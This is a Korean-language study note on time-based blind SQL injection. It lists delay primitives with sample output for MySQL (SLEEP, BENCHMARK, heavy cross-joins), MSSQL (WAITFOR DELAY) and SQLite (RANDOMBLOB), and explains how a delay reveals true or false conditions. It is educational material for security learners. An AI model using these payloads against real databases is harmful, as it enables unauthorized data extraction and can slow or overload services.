Time Based :
    Time Based Blind SQL Injection은 시간 지연을 이용해 참/거짓 여부를 판단합니다.

    시간지연을 발생시키는 방법으로는 DBMS에서 제공하는 함수를 이용하거나,
    무거운 연산과정을 발생시켜 쿼리 처리 시간을 지연시키는 heavy query 등이 존재합니다.

        benchmark 함수, heavy query 등과 같이 DBMS에서 기본적으로 제공하는 시간 지연함수가 아닌 경우에는 
        대상 시스템의 성능, 환경 등에 따라 지연 시간이 다르게 동작할 수도 있습니다.

    ex)
        SELECT IF(1=1, sleep(1), 0);
        /*
        mysql> SELECT IF(1=1, sleep(1), 0);
        +----------------------+
        | IF(1=1, sleep(1), 0) |
        +----------------------+
        |                    0 |
        +----------------------+
        1 row in set (1.00 sec)
        */
        
        SELECT IF(1=0, sleep(1), 0);
        /*
        mysql> SELECT IF(1=0, sleep(1), 0);
        +----------------------+
        | IF(1=0, sleep(1), 0) |
        +----------------------+
        |                    0 |
        +----------------------+
        1 row in set (0.00 sec)
        */

    If Statements의 조건이 참이 되는 경우 sleep함수가 실행되어 1초의 시간이 지연되었으며, 
    조건이 거짓이 되면 시간 지연이 발생하지 않은 것을 확인할 수 있습니다.

MySQL :
    1) sleep 함수
        ex)
            SLEEP(duration)
            /*
            mysql> SELECT SLEEP(1);
            +----------+
            | SLEEP(1) |
            +----------+
            |        0 |
            +----------+
            1 row in set (1.00 sec)
            */

    2) benchmark 함수 : 
        expr 식을 count 수만큼 실행하며 시간지연이 발생합니다.
        ex)
            BENCHMARK(count, expr)
            /*
            mysql> SELECT BENCHMARK(40000000,SHA1(1));
            +-----------------------------+
            | BENCHMARK(40000000,SHA1(1)) |
            +-----------------------------+
            |                           0 |
            +-----------------------------+
            1 row in set (10.78 sec)
            */

    3) heavy query
        information_schema.tables테이블은 MySQL에서 기본적으로 제공하는 시스템 테이블입니다.
        (자세한 내용은 시스템 테이블 페이지에서 자세히 다룹니다.) 

        기본적으로 많은 수의 데이터가 포함되어 있는 테이블입니다.
        information_schema.tables과 같이 많은 수의 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간을 지연시킵니다.
        ex)
            mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
            +----------+
            | heavy    |
            +----------+
            | 24897088 |
            +----------+
            1 row in set (1.41 sec)

        충분한 시간 지연이 발생하기에 데이터가 적은 경우에는 테이블을 여러번 추가하면 됩니다.

        ex)
            mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
            +-------+
            | heavy |
            +-------+
            | 85264 |
            +-------+
            1 row in set (0.01 sec)
            
            mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
            +----------+
            | heavy    |
            +----------+
            | 24897088 |
            +----------+
            1 row in set (1.38 sec)

MSSQL :
    1) waitfor
        ex)
            waitfor delay 'time_to_pass';
            /*
            > SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
            Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec
            */

    2) heavy query
        ex)
            select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
            /*
            Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
            */

SQLite :
    1) heavy query
        RANDOMBLOB에 의해 많은 수의 데이터가 생성되며, 변환 과정과 함수를 거치며 시간 지연이 발생한다는 점 등을 이용하여 공격에 활용할 수 있습니다.
        ex)
            LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
            /*
            sqlite> .timer ON
            sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
            0
            Run Time: real 9.740 user 7.983349 sys 1.743972
            */



















